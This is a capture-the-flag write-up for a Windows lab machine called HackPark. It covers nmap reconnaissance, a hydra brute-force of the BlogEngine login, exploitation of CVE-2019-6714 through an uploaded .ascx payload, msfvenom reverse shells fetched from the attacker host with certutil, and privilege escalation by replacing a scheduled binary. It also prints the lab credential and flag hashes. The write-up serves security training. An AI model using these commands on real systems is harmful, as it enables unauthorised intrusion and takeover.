# CTF Writeup: HackPark

---

## Reconaissance

Mapped 10.10.13.94 in /etc/hosts file to domain: hackpark.thm

```
sudo echo "10.10.13.94  hackpark.thm" | sudo tee -a /etc/hosts
```
Performed nmap scans to enumerate open services and performed version detection scan.

```
nmap -n -Pn -sS -p- 10.10.13.94                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 18:16 CDT
Nmap scan report for 10.10.13.94
Host is up (0.037s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 153.30 seconds
```
```
nmap -n -Pn -sCV -p 80,3389 10.10.13.94
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 18:20 CDT
Nmap scan report for 10.10.13.94
Host is up (0.033s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: hackpark | hackpark amusements
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2025-09-04T23:13:07
|_Not valid after:  2026-03-06T23:13:07
|_ssl-date: 2025-09-05T23:21:10+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2025-09-05T23:21:04+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.79 seconds
```
Access webpage, there was a huge clown picture, I copied the picture and performed a reverse image search on. 
The name of the clown is "pennywise".

```
https://tineye.com/
```

There is also a login page, let's try to brute-force credentials utilizing hydra:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt hackpark.thm http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=X4GqHjm%2Fev9TVexe0WCj3iV0rIAQbTiFVTQc1G3Ch%2BmeOsbDs3hPK6YDrH6G0r8LJPkFIaigLgkNlAZ%2FnaMLLh4wWznmbkv1jutWYDa01KodnHfbCQnIOs6ITaaJtjDUkUQzpbY%2FjViKoEArqx1GoTxxgyXk3BrRD5WG6P7IJSkOUSP%2FMdoZE3nMf4gT02vvXtf9LoeVBREDXfT6dwUlZWCUSsafaLFHHoOvVodsaFrgC0V%2Brx5UOc0l2KVew8ZRTE0qoIeErPh0PYPipVRHVgpO5wY8oOYbRPPhQMZvmOh4u1Cqh6Jebjvg3Siicxk%2FK6oH1VjDb%2F%2BjXNmACJQMC2bJiDb5LUMZ4VFCRbviheEBjOBq&__EVENTVALIDATION=rBKquadU77aQrT8wxotSXMZX61OQo3gLqpTvLWyoOiUKgky9yNOxcVlLN%2FbyQhCn18a6sXfp2%2FCiOSemOOvu2Gy1SqicL1PrOu0jqXXSQ17c64lWkj%2F4HnV%2FpB4QWUrH3K0%2BGR211thkJlgUQeYx2QZn9%2B10iigUNdE6ynwTX0%2BO%2FH82&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

```
admin:1qaz2wsx
```
Logged into webpage and retrieved BlogEngine 3.3.6.0 Version.


## Vulnerability Assessment & Initial Access 

Searched up for public CVE's and found CVE-2019-6714

Configured the exploit and changed it's name to "PostView.ascx"
Started up listener on port 1234

```
nc -lvnp 1234
```

Logged into the webpage board, went into the posts section and clicked on "add new".
Then on the icons, I pressed on file manager and uploaded the PostView.ascx payload.
Executing the payload is possible by using following uri to view:

```
http://hackpark.thm/?theme=../../App_Data/files
```

gained RCE as "iis apppool\blog"
Unfortunately the shell is very weak, so I decided to create my own payload and upload it onto the target machine.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.21.156.104 LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe

```

Uploaded the shell.exe on the target machine

```
certutil -urlcache -f http://10.21.156.104/shell.exe shell.exe
```

Started up metasploit exploit/multi/handler and configured it. Gained Meterpreter Session after executing shell.exe on the target machine.

## Privilege Escalation

To list running services on a windows machine, utilize following command:


```
wmic service list brief | findstr "Running"
```
The following command allowed me to view the .exe binary file and gave me information abt the path.

```
C:\\Program Files (x86)\SystemScheduler\
```

Utilized next command to list up all the running task binarys.

```
tasklist
```

The binary which is exploitable is "Message.exe" it runs every 30 seconds as Administrator.
Possible way to exploit this is just replace the file with an reverse shell payload.

Decided to create my payload utilizing msfvenom


```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.156.104 LPORT=9999 -f exe -o shell2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell2.exe
```
Uploaded file onto system and started up listener again on port 9999.
Gained RCE as Administrator and retrieved user.txt in C:\Users\jeff\Desktop

```
759bd8af507517bcfaede78a21a73e39
```

Retrived root.txt in C:\Users\Administrator\Desktop

```
7e13d97f05f7ceb9881a3eb3d78d3e72
```

We need to find out the original install time of winpeas.

```
systeminfo
```
```
8/3/2019, 10:43:23 AM
```
